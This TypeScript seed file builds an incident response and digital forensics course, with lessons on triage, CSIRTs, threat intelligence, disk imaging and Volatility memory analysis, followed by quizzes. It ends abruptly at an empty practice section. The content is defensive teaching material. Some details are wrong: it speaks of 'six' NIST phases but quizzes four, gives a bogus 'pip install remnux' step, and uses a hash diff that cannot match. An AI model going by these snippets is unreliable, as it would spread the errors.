import { PrismaClient } from '@prisma/client';
import { createCourseWithQuizzes } from './seed-enrich-helpers';

export async function seedEnrichCoursesNew(prisma: PrismaClient) {
  console.log('Seeding 10 new enriched courses...');
  // ====================================================================
  // 1. Incident Response & Digital Forensics
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Incident Response & Digital Forensics',
    'Master the art of detecting, responding to, and recovering from security incidents. This comprehensive course covers the full incident response lifecycle, digital forensics methodologies, evidence collection and preservation, and post-incident analysis.',
    30,
    [
      {
        title: 'Foundations of Incident Response',
        order: 1,
        lessons: [
          {
            title: 'Incident Response Lifecycle & Frameworks',
            order: 1,
            content: `# Incident Response Lifecycle & Frameworks

### Learning Objectives

- Understand the six phases of the NIST incident response lifecycle
- Compare IR frameworks including NIST SP 800-61, SANS, and MITRE ATT&CK
- Identify the roles and responsibilities within an incident response team
- Create a basic incident response policy document

### Section 1: The NIST Incident Response Lifecycle

The National Institute of Standards and Technology (NIST) defines six phases of incident response that form the backbone of any effective IR program. Understanding these phases is critical for security professionals who will be called upon to respond to breaches, intrusions, and other security events. Preparation is the foundation of effective incident response. During this phase, organizations establish the tools, processes, and teams needed to respond to incidents. Key activities include deploying intrusion detection systems, configuring SIEM platforms, establishing communication channels, and training response team members. Detection and Analysis involves identifying potential security incidents through monitoring, alerting, and user reports. Analysis determines whether an alert represents a true incident and assesses its scope and severity. Security analysts review SIEM alerts, IDS notifications, EDR telemetry, and system logs to identify anomalous activity. Effective analysis requires understanding the difference between false positives and true positives, and documentation during this phase is essential.

Containment strategies differ based on incident type. For network intrusions, containment may involve isolating affected segments. For malware outbreaks, it may require disconnecting affected hosts. Short-term containment stabilizes the situation while long-term containment preserves evidence and prevents further damage. Eradication removes the threat from the environment through deleting malware, disabling compromised accounts, patching vulnerabilities, or rebuilding systems from known-good images. Recovery restores affected systems to normal operation, validating that the threat has been fully removed before reconnecting systems.

\`\`\`bash
# Setting up a basic incident response toolkit
sudo apt-get install -y autopsy sleuthkit wireshark nmap
sudo pip install volatility remnux
mkdir -p ~/ir-evidence/{case-001/{disk-images,ram-dumps,network-captures,logs,reports}}
\`\`\`

### Section 2: Comparing IR Frameworks

The SANS Institute uses a four-step model: Preparation, Identification, Eradication, and Recovery. MITRE ATT&CK provides a knowledge base of adversary tactics and techniques that maps directly to detection and response activities. The ISO 27035 standard provides an international framework for incident management. Organizations should select a framework that aligns with their regulatory requirements and operational maturity. Building an IR team requires careful role assignment. A mature IR team includes an incident commander who coordinates the overall response, a forensic analyst who handles evidence collection, a communications lead who manages stakeholder updates, a legal counsel liaison, and technical responders who execute containment and eradication activities.

### Section 3: Post-Incident Activity

Post-incident review, often called a lessons learned meeting, is critical for organizational improvement. The team documents what happened, what worked well, what failed, and what can be improved. This phase produces an incident report that feeds into updated procedures, improved detection rules, and enhanced training programs. Organizations should establish metrics to measure IR effectiveness, including mean time to detect (MTTD), mean time to respond (MTTR), and incident volume trends over time. These metrics help justify security investments and identify areas for improvement.

### Section 4: Creating IR Policies and Procedures

An effective incident response policy must be tailored to the organization's specific environment, regulatory requirements, and risk appetite. The policy should define what constitutes an incident, establish severity levels, outline notification procedures, and specify documentation requirements. Regular tabletop exercises and red team engagements validate that policies and procedures work as intended under realistic conditions. An untested plan is a theoretical plan — the worst time to discover gaps is during a real incident.

### Hands-On Practice

1. Set up a lab environment with Wazuh or Elastic SIEM, deploy a vulnerable VM, simulate a basic intrusion using Metasploit, and practice the detection and analysis phase.
2. Create an incident response policy document for a fictional mid-size company including roles, severity matrix, and communication templates.
3. Conduct a tabletop exercise with team members using a ransomware scenario and document the lessons learned.

### Key Takeaways

- The NIST lifecycle provides a comprehensive, repeatable process for incident response
- Preparation is the most critical phase — without it all other phases suffer
- Document everything during an incident; documentation is legal evidence
- Regular tabletop exercises and red team engagements validate your IR readiness

### References

- NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide
- SANS Incident Response Process: https://www.sans.org/white-papers/incident-response-process/
- MITRE ATT&CK Framework: https://attack.mitre.org/`,
            questions: [
              { text: 'What are the phases of the NIST incident response lifecycle?', answers: [{ text: 'Preparation, Detection and Analysis, Containment/Eradication/Recovery, Post-Incident Activity', isCorrect: true }, { text: 'Planning, Detection, Response, Recovery', isCorrect: false }, { text: 'Prevention, Detection, Correction', isCorrect: false }, { text: 'Identification, Containment, Eradication', isCorrect: false }] },
              { text: 'Which phase of incident response is considered the most critical?', answers: [{ text: 'Preparation, as it establishes the foundation for all other phases', isCorrect: true }, { text: 'Post-Incident Activity', isCorrect: false }, { text: 'Detection and Analysis', isCorrect: false }, { text: 'Eradication', isCorrect: false }] },
              { text: 'What does MITRE ATT&CK provide for incident response?', answers: [{ text: 'A knowledge base of adversary tactics and techniques mapped to detection and response', isCorrect: true }, { text: 'Automated incident response tools', isCorrect: false }, { text: 'A SIEM platform for log analysis', isCorrect: false }, { text: 'Malware reverse engineering capabilities', isCorrect: false }] },
              { text: 'Who coordinates the overall incident response effort?', answers: [{ text: 'The incident commander', isCorrect: true }, { text: 'The forensic analyst', isCorrect: false }, { text: 'The communications lead', isCorrect: false }, { text: 'The legal counsel', isCorrect: false }] },
            ],
          },
          {
            title: 'Incident Classification & Triage',
            order: 2,
            content: `# Incident Classification & Triage

### Learning Objectives

- Classify security incidents by type, severity, and impact
- Apply structured triage methodologies to prioritize response efforts
- Understand incident severity levels and escalation procedures
- Create incident tickets with accurate and actionable information

### Section 1: Incident Types and Taxonomies

Security incidents span a wide range of events, each requiring different response approaches. Malware incidents include ransomware, trojans, worms, fileless malware, and advanced persistent threats (APTs). Ransomware is classified as high severity due to its potential for data loss and operational disruption. Unauthorized access incidents involve attackers gaining access to systems, accounts, or data without permission. This includes brute force attacks, credential stuffing, privilege escalation, and account compromise. The severity depends on what the attacker accessed — a compromised service account is less critical than a compromised domain administrator.

Denial of Service incidents disrupt service availability through volumetric attacks or application-layer exploitation. Data breaches involve unauthorized access to or exfiltration of sensitive data and require immediate legal and regulatory notification based on the volume and sensitivity of compromised data. Each incident type requires a specific response playbook to ensure efficient and effective handling.

\`\`\`bash
# Quick triage: check for ransomware indicators
find / -name "*.encrypted" -o -name "*.locked" -o -name "README_DECRYPT*" 2>/dev/null
ps auxf | grep -i -E "encrypt|crypt|lock"
find /home -type f -mmin -30 -name "*.doc*" -o -name "*.pdf" 2>/dev/null
\`\`\`

### Section 2: Severity Classification Matrix

Organizations should define clear severity levels that drive response timelines and resource allocation. Critical incidents such as active breaches with data exfiltration require immediate response. High incidents like confirmed intrusions with limited scope require response within one hour. Medium incidents such as suspicious activity require attention within four hours, while low incidents like policy violations can wait up to twenty-four hours. A clear severity matrix eliminates guesswork during high-pressure situations. Every member of the incident response team should be able to classify an incident consistently. The classification criteria should account for data sensitivity, system criticality, regulatory implications, and business impact.

### Section 3: The Triage Process

Triage is the initial assessment that determines the nature, scope, and severity of a potential incident. The triage analyst reviews available data including SIEM alerts, EDR notifications, user reports, and threat intelligence feeds. Key triage questions include: What is happening? Which systems are affected? Is the threat still active? What is the potential impact? Is this a known threat or novel activity? Effective triage requires access to threat intelligence, network diagrams, asset inventories, and system documentation. Analysts should maintain quick-reference guides for common incident types to accelerate decision-making during high-pressure situations.

### Section 4: Escalation Procedures

Escalation procedures define when and how incidents are elevated to higher levels of response. Technical escalation occurs when responders cannot contain the threat within defined timeframes. Management escalation happens when decisions require authority beyond the IR team scope. Legal escalation is triggered by evidence of criminal activity or regulatory breach. Maintaining a list of pre-vetted external IR firms through retainer agreements ensures rapid access to additional expertise during major incidents. The quality of triage directly impacts the effectiveness of the entire response effort.

### Hands-On Practice

1. Create a triage playbook for three common incident types documenting investigation steps, key logs, containment decisions, and escalation criteria.
2. Walk through a simulated phishing scenario practicing the triage process from initial alert to classification.
3. Review historical incident tickets and evaluate classification accuracy.

### Key Takeaways

- Consistent classification ensures appropriate resource allocation and response prioritization
- A clear severity matrix eliminates guesswork during high-pressure situations
- Triage quality directly impacts response effectiveness
- Regularly update classification criteria based on evolving threats

### References

- NIST SP 800-61 Rev. 2, Section 3.2: Detection and Analysis
- SANS Incident Classification: https://www.sans.org/reading-room/
- FIRST.org Common Event Format: https://www.first.org/cef/`,
            questions: [
              { text: 'What is the primary purpose of incident classification?', answers: [{ text: 'To ensure appropriate resource allocation and response prioritization', isCorrect: true }, { text: 'To determine if the incident is real', isCorrect: false }, { text: 'To assign blame', isCorrect: false }, { text: 'To determine legal liability', isCorrect: false }] },
              { text: 'What is the first question a triage analyst should ask?', answers: [{ text: 'What is happening and which systems are affected?', isCorrect: true }, { text: 'Who caused the incident?', isCorrect: false }, { text: 'How much will this cost?', isCorrect: false }, { text: 'Should we notify law enforcement?', isCorrect: false }] },
              { text: 'When should management escalation occur?', answers: [{ text: 'When decisions require authority beyond the IR team scope', isCorrect: true }, { text: 'Only after the incident is resolved', isCorrect: false }, { text: 'Only during business hours', isCorrect: false }, { text: 'When the first alert is received', isCorrect: false }] },
              { text: 'Why is tracking triage accuracy important?', answers: [{ text: 'It helps identify calibration issues and improve classification consistency', isCorrect: true }, { text: 'It is only required for compliance', isCorrect: false }, { text: 'It helps reduce the number of incidents', isCorrect: false }, { text: 'It is not important', isCorrect: false }] },
            ],
          },
          {
            title: 'Building the CSIRT',
            order: 3,
            content: `# Building the CSIRT

### Learning Objectives

- Design a Computer Security Incident Response Team structure
- Define roles, responsibilities, and authority for team members
- Establish on-call rotations and escalation procedures
- Build relationships with external IR partners

### Section 1: CSIRT Organizational Structure

A Computer Security Incident Response Team (CSIRT) is a dedicated group responsible for detecting, analyzing, and responding to cybersecurity incidents. The structure depends on organizational size, industry, regulatory requirements, and risk appetite. The core roles include an incident commander who makes strategic decisions, technical responders who execute forensic analysis and containment, a communications lead for stakeholder updates, and a legal liaison for regulatory advice. The team should have a clearly defined charter establishing authority, scope, and decision-making procedures. CSIRTs that report directly to the CISO or CTO have greater independence and authority. Teams buried under IT operations may face conflicts of interest when incidents involve IT system failures.

### Section 2: Skills and Training Requirements

CSIRT members need diverse skills spanning technical analysis, communication, and project management. Technical skills include network forensics, malware analysis, log analysis, SIEM operations, and system administration. Soft skills include clear communication under pressure, documentation, and explaining technical findings to non-technical stakeholders. Training programs should include regular tabletop exercises, red team engagements, capture-the-flag competitions, and external courses. Cross-training ensures the team functions when key members are unavailable.

\`\`\`bash
# CSIRT communication channel structure
mkdir -p ~/csirt/{playbooks,templates,evidence,reports}
cat > ~/csirt/playbooks/ransomware-response.md << 'EOF'
# Ransomware Response Playbook
## Immediate Actions
1. Isolate affected systems from network
2. Preserve evidence before remediation
3. Activate communication plan
4. Engage legal counsel
## Investigation
1. Determine initial infection vector
2. Identify scope of encryption
3. Check for data exfiltration
4. Assess backup integrity
## Recovery
1. Restore from verified clean backups
2. Patch vulnerabilities
3. Implement additional monitoring
4. Conduct lessons learned review
EOF
\`\`\`

### Section 3: On-Call and Escalation Procedures

Effective on-call procedures ensure incidents are handled promptly regardless of when they occur. The on-call rotation should be documented, tested, and communicated. Escalation procedures should be automatic rather than discretionary. Critical incidents should generate immediate notification to the CISO, CTO, and CEO regardless of time of day. The escalation matrix should include contact information for all stakeholders, external IR firms, legal counsel, law enforcement contacts, and insurance providers. Test these contacts quarterly to ensure accuracy.

### Section 4: External Relationships

Organizations should establish relationships with external IR firms before incidents occur. Retainer agreements guarantee rapid access to additional expertise during major incidents. Law enforcement relationships should be established proactively so that notification during an incident is not the first contact. Industry-specific ISACs provide threat intelligence and peer support. Building these relationships during peacetime ensures they function effectively during crises.

### Hands-On Practice

1. Design a CSIRT charter for a 500-person technology company including roles, authority, escalation matrix, and communication procedures.
2. Create a 24/7 on-call rotation schedule for a team of four analysts.
3. Establish a relationship with a local FBI Cyber Task Force office and document contact procedures.

### Key Takeaways

- CSIRT structure should match organizational size and risk appetite
- Clear authority and decision-making procedures prevent delays during incidents
- Cross-training ensures team resilience when key members are unavailable
- External relationships must be established before incidents occur

### References

- NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide
- SANS Building a CSIRT: https://www.sans.org/information-security-policy/
- FIRST.org: https://www.first.org/`,
            questions: [
              { text: 'Why should the CSIRT report directly to the CISO?', answers: [{ text: 'To avoid conflicts of interest when incidents involve IT system failures', isCorrect: true }, { text: 'Because CISOs have more technical skills', isCorrect: false }, { text: 'It makes no difference', isCorrect: false }, { text: 'Because IT operations does not handle security', isCorrect: false }] },
              { text: 'What is the primary benefit of retainer agreements with external IR firms?', answers: [{ text: 'Guaranteed rapid access to expertise during major incidents', isCorrect: true }, { text: 'Reduced everyday costs', isCorrect: false }, { text: 'Elimination of internal IR team', isCorrect: false }, { text: 'Automatic compliance', isCorrect: false }] },
              { text: 'Why should escalation procedures be automatic?', answers: [{ text: 'To ensure critical incidents receive immediate attention without human delay', isCorrect: true }, { text: 'Because team members cannot be trusted', isCorrect: false }, { text: 'It reduces incidents', isCorrect: false }, { text: 'Only for compliance', isCorrect: false }] },
              { text: 'How often should external IR partner contacts be tested?', answers: [{ text: 'Quarterly', isCorrect: true }, { text: 'Annually', isCorrect: false }, { text: 'Only when an incident occurs', isCorrect: false }, { text: 'Testing is not necessary', isCorrect: false }] },
            ],
          },
          {
            title: 'Threat Intelligence for IR',
            order: 4,
            content: `# Threat Intelligence for IR

### Learning Objectives

- Understand threat intelligence types and their role in incident response
- Collect, analyze, and operationalize threat intelligence
- Use MITRE ATT&CK to map adversary behaviors
- Integrate threat feeds into detection and response workflows

### Section 1: Threat Intelligence Types

Threat intelligence is evidence-based knowledge about existing or emerging threats. Strategic threat intelligence provides high-level information for executive audiences. Tactical threat intelligence describes adversary TTPs for security practitioners. Operational threat intelligence provides specific, actionable details about imminent attacks. Technical threat intelligence consists of IOCs such as IP addresses, domain names, file hashes, and YARA rules. Each type serves a different purpose in the IR lifecycle. Strategic intelligence informs risk management decisions. Tactical intelligence guides detection rule development. Operational intelligence enables proactive defense. Technical intelligence feeds automated detection systems.

### Section 2: Collecting and Analyzing Intelligence

Threat intelligence collection involves gathering data from multiple sources. OSINT includes security blogs, vulnerability databases, and public threat reports. Commercial threat feeds provide curated intelligence. Industry ISACs share sector-specific threat information. Internal intelligence comes from the organization's own incident history. Analysis transforms raw data into actionable intelligence. The Diamond Model of Intrusion Analysis maps relationships between adversaries, capabilities, infrastructure, and victims. Analysis should produce assessments with confidence levels, supporting evidence, and recommended actions.

### Section 3: Operationalizing Intelligence

The true value of threat intelligence is realized when operationalized into detection and response capabilities. This means translating IOCs into detection rules, mapping adversary TTPs to defensive controls, and using intelligence to prioritize vulnerability remediation. MITRE ATT&CK provides the mapping framework.

\`\`\`python
# Converting threat intelligence to detection rules
threat_intel = {
    "adversary": "APT29",
    "techniques": [{
        "id": "T1059.001",
        "name": "PowerShell",
        "detection": {
            "process_name": "powershell.exe",
            "conditions": ["encoded_command", "bypass", "hidden"],
            "severity": "high"
        }
    }]
}

def create_detection_rule(technique):
    return {
        "title": f"Detection of {technique['name']}",
        "mitre": technique["id"],
        "severity": technique["detection"]["severity"],
        "condition": " OR ".join(technique["detection"]["conditions"]),
        "action": "alert"
    }
\`\`\`

### Section 4: Intelligence Sharing

Effective threat intelligence sharing strengthens the entire security community. STIX provides a standardized language for describing threat intelligence. TAXII defines protocols for sharing STIX data. MISP provides a platform for collecting, storing, and distributing IOCs. Organizations should establish sharing relationships with peers, participate in ISACs, and contribute to open-source threat intelligence communities. Classification and handling procedures must be established to protect sensitive information while enabling effective sharing.

### Hands-On Practice

1. Use the MITRE ATT&CK navigator to map techniques observed in a recent incident.
2. Create YARA rules based on threat intelligence reports and test them against malware samples.
3. Set up a MISP instance and import threat feeds from three sources.

### Key Takeaways

- Different types of threat intelligence serve different audiences
- Intelligence must be operationalized to provide value
- MITRE ATT&CK provides the framework for mapping adversary techniques to defenses
- Sharing intelligence strengthens the entire security community

### References

- MITRE ATT&CK: https://attack.mitre.org/
- STIX/TAXII Standards: https://oasis-open.github.io/cti-documentation/
- MISP Project: https://www.misp-project.org/`,
            questions: [
              { text: 'What type of threat intelligence describes adversary TTPs for practitioners?', answers: [{ text: 'Tactical threat intelligence', isCorrect: true }, { text: 'Strategic threat intelligence', isCorrect: false }, { text: 'Technical threat intelligence', isCorrect: false }, { text: 'Operational threat intelligence', isCorrect: false }] },
              { text: 'What does operationalizing threat intelligence mean?', answers: [{ text: 'Translating IOCs and TTPs into detection rules and response procedures', isCorrect: true }, { text: 'Collecting raw threat data', isCorrect: false }, { text: 'Storing intelligence in a database', isCorrect: false }, { text: 'Briefing executives', isCorrect: false }] },
              { text: 'What framework maps adversary techniques to defensive controls?', answers: [{ text: 'MITRE ATT&CK', isCorrect: true }, { text: 'NIST CSF', isCorrect: false }, { text: 'ISO 27001', isCorrect: false }, { text: 'COBIT', isCorrect: false }] },
              { text: 'What standard provides a language for describing threat intelligence?', answers: [{ text: 'STIX', isCorrect: true }, { text: 'HTTP', isCorrect: false }, { text: 'SQL', isCorrect: false }, { text: 'XML', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Digital Forensics Techniques',
        order: 2,
        lessons: [
          {
            title: 'Forensic Acquisition & Preservation',
            order: 1,
            content: `# Forensic Acquisition & Preservation

### Learning Objectives

- Perform forensic disk imaging using industry-standard tools
- Understand write blockers and their role in evidence integrity
- Verify forensic images using cryptographic hash functions
- Maintain chain of custody documentation

### Section 1: The Foundation of Digital Forensics

Digital forensics begins with proper evidence preservation. A forensic image is a bit-for-bit copy of a storage device that captures all data, including deleted files, slack space, and unallocated clusters. The cardinal rule is: never work on original evidence. Every analysis must be performed on forensic copies. Write blockers are hardware or software devices that prevent any write operations to the source media during imaging. Hardware write blockers intercept SATA/USB commands at the physical level, providing the strongest guarantee of write protection. Without a write blocker, connecting a drive to an analysis workstation could modify timestamps or create temporary files, compromising evidentiary value.

\`\`\`bash
# Using dc3dd for forensic imaging with hash verification
sudo dc3dd if=/dev/sdb of=/ir-evidence/case-001/disk-image.e01 \
  hlog=/ir-evidence/case-001/hash-log.txt \
  log=/ir-evidence/case-001/imaging-log.txt \
  hash=sha256
\`\`\`

### Section 2: Forensic Imaging Formats

Raw (dd) provides uncompressed bit-for-bit copies with universal compatibility. E01 (EnCase Evidence File) includes compression, metadata, and integrity checking, making it the industry standard. AFF4 is an open format with compression, encryption, and deduplication. E01 is the most widely supported format across forensic tools. It includes headers for case information, compression reduces storage requirements, and embedded hash values simplify verification. The format supports segmentation for large images, enabling storage across multiple media or network locations.

### Section 3: Cryptographic Hash Verification

Before and after imaging, cryptographic hash functions verify image integrity. SHA-256 is the current standard for forensic verification. MD5 should no longer be used due to known collision vulnerabilities. Courts and regulatory bodies increasingly expect SHA-256 verification in forensic procedures.

\`\`\`bash
# Generate SHA-256 hash of source drive
sudo sha256sum /dev/sdb > /ir-evidence/case-001/source-hash-pre.txt
# Generate SHA-256 hash of forensic image
sha256sum /ir-evidence/case-001/disk-image.e01 > /ir-evidence/case-001/image-hash.txt
# Verify the hashes match
diff /ir-evidence/case-001/source-hash-pre.txt /ir-evidence/case-001/image-hash.txt
\`\`\`

### Section 4: Chain of Custody and Volatile Data

Chain of custody documentation tracks evidence handling from collection through final disposition. Every person who touches the evidence must be recorded with date, time, location, and purpose. Gaps in chain of custody can result in evidence being ruled inadmissible. Before imaging disks, volatile data must be collected from running systems. Volatile data includes memory contents, running processes, network connections, and open files. Collection order follows volatility: CPU registers and cache first, then routing tables, process tables, memory, and finally disk image.

### Hands-On Practice

1. Perform forensic disk imaging using dc3dd, documenting every step and calculating SHA-256 hashes.
2. Create a chain of custody form and practice transferring evidence between team members.
3. Collect volatile data from a running Linux system using a custom script.

### Key Takeaways

- Never work on original evidence; always create forensic images first
- Hardware write blockers provide the strongest guarantee of evidence integrity
- SHA-256 is the current standard for forensic hash verification
- Chain of custody gaps can render evidence inadmissible

### References

- NIST SP 800-86: Guide to Integrating Forensic Techniques
- SANS Digital Forensics: https://www.sans.org/dfir/
- The Sleuth Kit: https://www.sleuthkit.org/`,
            questions: [
              { text: 'Why should you never work on original evidence?', answers: [{ text: 'To preserve original evidence for independent verification and courtroom presentation', isCorrect: true }, { text: 'Because original evidence is always encrypted', isCorrect: false }, { text: 'Because forensic tools cannot read original evidence', isCorrect: false }, { text: 'Because original evidence is too large', isCorrect: false }] },
              { text: 'What is the current standard cryptographic hash for forensic verification?', answers: [{ text: 'SHA-256', isCorrect: true }, { text: 'MD5', isCorrect: false }, { text: 'SHA-1', isCorrect: false }, { text: 'CRC32', isCorrect: false }] },
              { text: 'What does a hardware write blocker do?', answers: [{ text: 'Prevents write operations to source media during forensic imaging', isCorrect: true }, { text: 'Encrypts evidence during collection', isCorrect: false }, { text: 'Speeds up the imaging process', isCorrect: false }, { text: 'Creates compressed images', isCorrect: false }] },
              { text: 'What data should be collected first during volatile data acquisition?', answers: [{ text: 'CPU registers and cache, as they are the most volatile', isCorrect: true }, { text: 'Disk images', isCorrect: false }, { text: 'Remote logging data', isCorrect: false }, { text: 'Network configuration', isCorrect: false }] },
            ],
          },
          {
            title: 'Memory Forensics Fundamentals',
            order: 2,
            content: `# Memory Forensics Fundamentals

### Learning Objectives

- Capture system memory for forensic analysis
- Extract processes, network connections, and credentials from memory dumps
- Detect malware artifacts including code injections and rootkits
- Use Volatility framework for memory analysis

### Section 1: Why Memory Forensics Matters

Memory forensics examines RAM contents to find evidence not available on disk. Running processes, network connections, encryption keys, passwords, clipboard contents, and fileless malware artifacts all reside in volatile memory. When a system is powered off, this evidence is lost permanently. Modern malware increasingly operates in memory to avoid detection. Fileless malware executes entirely in RAM, using legitimate system tools for persistence. Encrypted communication sessions may contain decryption keys in memory. Active network connections reveal command-and-control channels invisible on disk.

### Section 2: Memory Acquisition Methods

Capturing memory requires specialized tools that read physical memory without altering its contents. Tools like WinPmem, LiME (Linux Memory Extractor), and DumpIt create raw memory dumps suitable for analysis. The acquisition process must minimize system interaction to avoid modifying memory contents being captured.

\`\`\`bash
# Linux memory acquisition with LiME
sudo insmod lime.ko "path=/mnt/usb/memory.lime format=lime"
# Windows memory acquisition
DumpIt.exe
# Analyze with Volatility 3
volatility3 -f memory.lime windows.pslist
volatility3 -f memory.lime windows.netscan
volatility3 -f memory.lime windows.hashdump
\`\`\`

### Section 3: Volatility Analysis Framework

Volatility is the industry-standard open-source memory forensics framework. Version 3 supports Windows, Linux, and Mac through a plugin architecture. Plugins include pslist (lists processes), pstree (shows process hierarchy), psscan (finds hidden processes), psxview (cross-references multiple enumeration methods to detect rootkits), and netscan for network connections. Credential plugins extract NTLM hashes, Kerberos tickets, and cached credentials.

### Section 4: Advanced Memory Analysis

Advanced techniques include detecting code injection by identifying process memory regions with execute permissions not backed by a file on disk. Rootkit detection involves comparing process lists from multiple enumeration methods — processes visible to low-level APIs but not high-level APIs may be hidden.

\`\`\`bash
# Detect injected code
volatility3 -f memory.lime windows.malfind --pid 1234
# Compare process enumeration methods
volatility3 -f memory.lime windows.pslist > pslist.txt
volatility3 -f memory.lime windows.psscan > psscan.txt
diff pslist.txt psscan.txt
\`\`\`

Memory timeline analysis reconstructs system activity by combining timestamps from multiple sources, enabling chronological event reconstruction.

### Hands-On Practice

1. Capture a memory dump and use Volatility to enumerate processes and network connections.
2. Use the malfind plugin to identify suspicious process memory regions.
3. Compare pslist and psscan output to identify hidden processes.

### Key Takeaways

- Memory forensics captures evidence unavailable through disk analysis
- Memory acquisition must be fast and minimize system interaction
- Volatility provides comprehensive plugins for memory analysis
- Cross-referencing enumeration methods reveals hidden artifacts

### References

- Volatility Foundation: https://www.volatilityfoundation.org/
- SANS Memory Forensics: https://www.sans.org/white-papers/memory-forensics/
- Lenny Zeltser Memory Forensics: https://zeltser.com/memory-forensics/`,
            questions: [
              { text: 'Why is memory forensics critical for detecting fileless malware?', answers: [{ text: 'Fileless malware executes entirely in RAM and leaves minimal disk artifacts', isCorrect: true }, { text: 'Fileless malware can only be found in memory dumps', isCorrect: false }, { text: 'Memory forensics is faster', isCorrect: false }, { text: 'Fileless malware encrypts all disk evidence', isCorrect: false }] },
              { text: 'What does the Volatility psxview plugin do?', answers: [{ text: 'Cross-references multiple enumeration methods to detect hidden processes', isCorrect: true }, { text: 'Lists all running processes', isCorrect: false }, { text: 'Extracts network connections', isCorrect: false }, { text: 'Scans for malware signatures', isCorrect: false }] },
              { text: 'What should be used as storage during live memory acquisition?', answers: [{ text: 'External media to avoid contaminating the evidence', isCorrect: true }, { text: 'The system hard drive', isCorrect: false }, { text: 'A network share', isCorrect: false }, { text: 'Cloud storage', isCorrect: false }] },
              { text: 'What do execute-permission memory regions without backing files indicate?', answers: [{ text: 'Possible code injection or reflective DLL loading', isCorrect: true }, { text: 'Normal application behavior', isCorrect: false }, { text: 'OS updates', isCorrect: false }, { text: 'Hardware driver loading', isCorrect: false }] },
            ],
          },
          {
            title: 'Disk Forensics & File System Analysis',
            order: 3,
            content: `# Disk Forensics & File System Analysis

### Learning Objectives

- Navigate file system structures for forensic analysis
- Recover deleted files and analyze file system metadata
- Examine NTFS, ext4, and APFS artifacts
- Use Autopsy and The Sleuth Kit for disk analysis

### Section 1: File System Structures

File systems organize data on storage media using defined structures. NTFS stores metadata in the Master File Table (MFT), supporting ACLs, journaling, alternate data streams, and encryption. The MFT contains a record for every file including timestamps, permissions, and data run locations. ext4 uses inodes to store metadata including timestamps, permissions, and data block pointers. Understanding these structures is essential because evidence often resides in structures not visible through normal OS interfaces.

### Section 2: Deleted File Recovery

Deleted files are not immediately erased. File systems mark space as available but do not overwrite data immediately. This creates a recovery window. Recovery tools scan structures for entries marked as deleted and reconstruct file contents.

\`\`\`bash
# Recover deleted files with The Sleuth Kit
tsk_recover -i ntfs disk-image.e01 recovered-files/
tsk_loaddb -a -d case-001.db disk-image.e01
sqlite3 case-001.db "SELECT name, inode FROM tsk_files WHERE name LIKE '%.doc%'"
icat -i ntfs disk-image.e01 12345 > recovered-file.doc
\`\`\`

### Section 3: File System Metadata Analysis

File system timestamps provide crucial timeline evidence. NTFS stores creation, modification, access, and MFT change timestamps. Understanding timestamp relationships reveals file activity patterns. Timestamp manipulation (timestomping) is a common anti-forensic technique. Detecting it requires comparing timestamps across different metadata sources and looking for inconsistencies.

### Section 4: Autopsy and TSK Integration

Autopsy is a graphical forensic analysis platform built on The Sleuth Kit (TSK). It provides file browsing, keyword search, timeline analysis, and deleted file recovery. Autopsy supports multiple evidence sources simultaneously, enabling correlation across disk images, memory dumps, and log files. Its module architecture allows ingest modules that extract web history, email, and installed applications.

### Hands-On Practice

1. Create a forensic image and use Autopsy to browse the file system and identify deleted files.
2. Analyze MFT entries to construct a timeline of file activity.
3. Use TSK command-line tools to recover deleted files and verify integrity.

### Key Takeaways

- File system metadata provides critical timeline evidence
- Deleted files can be recovered until storage space is reallocated
- NTFS timestamps reveal file creation, modification, access, and deletion patterns
- Autopsy and TSK provide complementary tools for disk analysis

### References

- The Sleuth Kit: https://www.sleuthkit.org/
- Autopsy: https://www.autopsy.com/
- SANS Disk Forensics: https://www.sans.org/white-papers/disk-forensics/`,
            questions: [
              { text: 'What does the NTFS MFT contain?', answers: [{ text: 'A record for every file including timestamps, permissions, and data locations', isCorrect: true }, { text: 'Only deleted file references', isCorrect: false }, { text: 'Only file contents', isCorrect: false }, { text: 'Network configuration data', isCorrect: false }] },
              { text: 'Why can deleted files often be recovered?', answers: [{ text: 'File systems mark space as available but do not immediately overwrite data', isCorrect: true }, { text: 'Deleted files move to a hidden partition', isCorrect: false }, { text: 'Operating systems keep backup copies', isCorrect: false }, { text: 'File systems cannot actually delete files', isCorrect: false }] },
              { text: 'What is timestomping?', answers: [{ text: 'An anti-forensic technique modifying file timestamps', isCorrect: true }, { text: 'A technique for recovering deleted files', isCorrect: false }, { text: 'A method for encrypting metadata', isCorrect: false }, { text: 'A tool for creating forensic images', isCorrect: false }] },
              { text: 'What is the primary advantage of Autopsy?', answers: [{ text: 'Graphical interface built on TSK with module-based artifact extraction', isCorrect: true }, { text: 'It can only analyze NTFS', isCorrect: false }, { text: 'It automatically recovers all deleted files', isCorrect: false }, { text: 'It replaces command-line tools', isCorrect: false }] },
            ],
          },
          {
            title: 'Forensic Report Writing',
            order: 4,
            content: `# Forensic Report Writing

### Learning Objectives

- Write clear, accurate, and legally defensible forensic reports
- Document analysis methodology and findings
- Present evidence in a structured and reproducible format
- Understand legal requirements for forensic documentation

### Section 1: Purpose and Audience

A forensic report communicates investigation findings to its intended audience. Reports serve legal proceedings, provide actionable intelligence for incident response, record security posture, and serve as reference for future investigations. The report must be clear enough for non-technical readers while containing sufficient technical detail for independent verification. This dual requirement means reports should include an executive summary, technical analysis section, and appendix with supporting evidence.

### Section 2: Report Structure

A comprehensive report includes: Executive Summary providing high-level overview; Scope defining what was examined and tools used; Methodology describing analysis procedures; Findings presenting evidence and results; Conclusion synthesizing findings; and Appendix with supporting evidence. Each finding should include the evidence source, analysis technique, observation, and interpretation.

\`\`\`markdown
## Forensic Report Template
### Executive Summary
- Investigation scope and objectives
- Key findings
- Recommended actions
### Scope and Authorization
- Systems examined
- Time period covered
### Methodology
- Tools and versions
- Hash verification results
### Findings
- Finding 1: Description, Evidence, Analysis, Interpretation
### Conclusion
- Summary of results
- Remediation steps
\`\`\`

### Section 3: Writing for Legal Proceedings

Forensic reports may be used as evidence. They must be factual, objective, and free from speculation. Every statement must be supported by independently verifiable evidence. Document analyst qualifications, tools used, and validation procedures. Chain of custody documentation must be meticulous. Every transfer must be recorded. Gaps can result in evidence being ruled inadmissible.

### Section 4: Quality Assurance

Reports should undergo quality assurance review. Peer review verifies methodology, interpretation, and conclusions. QA checks include verifying hash values, confirming tool versions, and ensuring all findings are supported by evidence. Quality assurance should verify the report addresses original investigation objectives without exceeding the examination scope.

### Hands-On Practice

